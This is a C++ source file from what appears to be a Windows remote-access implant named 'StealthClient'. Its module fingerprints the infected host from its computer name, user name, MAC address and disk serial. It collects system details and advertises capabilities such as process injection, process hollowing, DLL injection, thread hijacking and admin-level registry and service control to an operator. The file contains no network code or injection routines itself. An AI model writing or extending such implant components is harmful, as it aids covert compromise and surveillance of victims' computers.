#include "system_info.h"
#include <iostream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <wincrypt.h>
#include <iphlpapi.h>

#pragma comment(lib, "crypt32.lib")

namespace StealthClient {

SystemInfoCollector::SystemInfo SystemInfoCollector::CollectSystemInfo()
{
    SystemInfo info;
    
    info.computerName = GetComputerName();
    info.userName = GetUserName();
    info.osVersion = GetOSVersion();
    info.architecture = GetArchitecture();
    info.hostname = GetHostname();
    info.ipAddress = GetLocalIPAddress();
    info.machineFingerprint = GenerateMachineFingerprint();
    info.capabilities = GetCapabilities();
    info.additionalInfo = GetAdditionalInfo();
    
    return info;
}

std::string SystemInfoCollector::GenerateMachineFingerprint()
{
    try {
        std::stringstream components;
        
        // Computer name
        components << GetComputerName() << "|";
        
        // User name
        components << GetUserName() << "|";
        
        // OS version
        components << GetOSVersion() << "|";
        
        // Architecture
        components << GetArchitecture() << "|";
        
        // Get MAC address
        IP_ADAPTER_INFO adapterInfo[16];
        DWORD dwBufLen = sizeof(adapterInfo);
        DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
        
        if (dwStatus == ERROR_SUCCESS) {
            PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
            while (pAdapterInfo) {
                if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET || 
                    pAdapterInfo->Type == IF_TYPE_IEEE80211) {
                    std::stringstream mac;
                    for (int i = 0; i < pAdapterInfo->AddressLength; i++) {
                        mac << std::hex << std::setw(2) << std::setfill('0') 
                            << static_cast<int>(pAdapterInfo->Address[i]);
                        if (i < pAdapterInfo->AddressLength - 1) mac << ":";
                    }
                    components << mac.str() << "|";
                    break;
                }
                pAdapterInfo = pAdapterInfo->Next;
            }
        }
        
        // Get volume serial number
        DWORD serialNumber;
        if (GetVolumeInformationA("C:\\", nullptr, 0, &serialNumber, nullptr, nullptr, nullptr, 0)) {
            components << std::hex << serialNumber << "|";
        }
        
        // Hash the combined string
        std::string combined = components.str();
        
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        
        if (CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            if (CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
                if (CryptHashData(hHash, reinterpret_cast<const BYTE*>(combined.c_str()), 
                                 static_cast<DWORD>(combined.length()), 0)) {
                    DWORD hashSize = 0;
                    DWORD hashSizeSize = sizeof(hashSize);
                    
                    if (CryptGetHashParam(hHash, HP_HASHSIZE, reinterpret_cast<BYTE*>(&hashSize), 
                                         &hashSizeSize, 0)) {
                        std::vector<BYTE> hashData(hashSize);
                        DWORD hashDataSize = hashSize;
                        
                        if (CryptGetHashParam(hHash, HP_HASHVAL, hashData.data(), &hashDataSize, 0)) {
                            std::stringstream fingerprint;
                            for (DWORD i = 0; i < hashSize; i++) {
                                fingerprint << std::hex << std::setw(2) << std::setfill('0') 
                                           << static_cast<int>(hashData[i]);
                            }
                            
                            CryptDestroyHash(hHash);
                            CryptReleaseContext(hProv, 0);
                            
                            return fingerprint.str().substr(0, 32);
                        }
                    }
                }
                CryptDestroyHash(hHash);
            }
            CryptReleaseContext(hProv, 0);
        }
    }
    catch (...) {
        // Fallback to a simple hash
    }
    
    // Fallback: use computer name + user name hash
    std::string fallback = GetComputerName() + GetUserName();
    std::hash<std::string> hasher;
    size_t hash = hasher(fallback);
    
    std::stringstream ss;
    ss << std::hex << hash;
    return ss.str().substr(0, 32);
}

std::string SystemInfoCollector::GetLocalIPAddress()
{
    try {
        IP_ADAPTER_INFO adapterInfo[16];
        DWORD dwBufLen = sizeof(adapterInfo);
        DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
        
        if (dwStatus == ERROR_SUCCESS) {
            PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
            while (pAdapterInfo) {
                if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET || 
                    pAdapterInfo->Type == IF_TYPE_IEEE80211) {
                    return std::string(pAdapterInfo->IpAddressList.IpAddress.String);
                }
                pAdapterInfo = pAdapterInfo->Next;
            }
        }
    }
    catch (...) {
        // Fallback
    }
    
    return "127.0.0.1";
}

std::vector<std::string> SystemInfoCollector::GetCapabilities()
{
    std::vector<std::string> capabilities;
    
    // Basic capabilities
    capabilities.push_back("execute_command");
    capabilities.push_back("system_info");
    capabilities.push_back("file_operations");
    
    // Windows-specific capabilities
    capabilities.push_back("process_injection");
    capabilities.push_back("dll_injection");
    capabilities.push_back("process_hollowing");
    capabilities.push_back("manual_dll_mapping");
    capabilities.push_back("thread_hijacking");
    
    // Advanced capabilities based on system
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        capabilities.push_back("x64_injection");
    } else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        capabilities.push_back("x86_injection");
    }
    
    // Check for admin privileges
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            if (elevation.TokenIsElevated) {
                capabilities.push_back("admin_privileges");
                capabilities.push_back("registry_access");
                capabilities.push_back("service_control");
            }
        }
        CloseHandle(hToken);
    }
    
    return capabilities;
}

std::string SystemInfoCollector::GetOSVersion()
{
    try {
        OSVERSIONINFOEX osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
        
        if (GetVersionEx(reinterpret_cast<OSVERSIONINFO*>(&osvi))) {
            std::stringstream ss;
            ss << "Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
            if (osvi.dwBuildNumber > 0) {
                ss << " Build " << osvi.dwBuildNumber;
            }
            return ss.str();
        }
    }
    catch (...) {
        // Fallback
    }
    
    return "Windows";
}

std::string SystemInfoCollector::GetArchitecture()
{
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    switch (sysInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            return "x64";
        case PROCESSOR_ARCHITECTURE_INTEL:
            return "x86";
        case PROCESSOR_ARCHITECTURE_ARM:
            return "ARM";
        case PROCESSOR_ARCHITECTURE_ARM64:
            return "ARM64";
        default:
            return "Unknown";
    }
}

std::string SystemInfoCollector::GetComputerName()
{
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    
    if (::GetComputerNameA(computerName, &size)) {
        return std::string(computerName);
    }
    
    return "Unknown";
}

std::string SystemInfoCollector::GetUserName()
{
    char userName[256];
    DWORD size = sizeof(userName);
    
    if (::GetUserNameA(userName, &size)) {
        return std::string(userName);
    }
    
    return "Unknown";
}

std::string SystemInfoCollector::GetHostname()
{
    return GetComputerName(); // Same as computer name on Windows
}

std::map<std::string, std::string> SystemInfoCollector::GetAdditionalInfo()
{
    std::map<std::string, std::string> info;
    
    try {
        // Memory info
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        if (GlobalMemoryStatusEx(&memStatus)) {
            info["total_memory_mb"] = std::to_string(memStatus.ullTotalPhys / (1024 * 1024));
            info["available_memory_mb"] = std::to_string(memStatus.ullAvailPhys / (1024 * 1024));
        }
        
        // CPU info
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        info["processor_count"] = std::to_string(sysInfo.dwNumberOfProcessors);
        info["page_size"] = std::to_string(sysInfo.dwPageSize);
        
        // Process info
        PROCESSENTRY32 pe32;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                DWORD processCount = 0;
                do {
                    processCount++;
                } while (Process32Next(hSnapshot, &pe32));
                info["process_count"] = std::to_string(processCount);
            }
            CloseHandle(hSnapshot);
        }
        
        // Uptime
        DWORD uptime = GetTickCount();
        info["uptime_ms"] = std::to_string(uptime);
        
    }
    catch (...) {
        // Ignore errors
    }
    
    return info;
}

} // namespace StealthClient
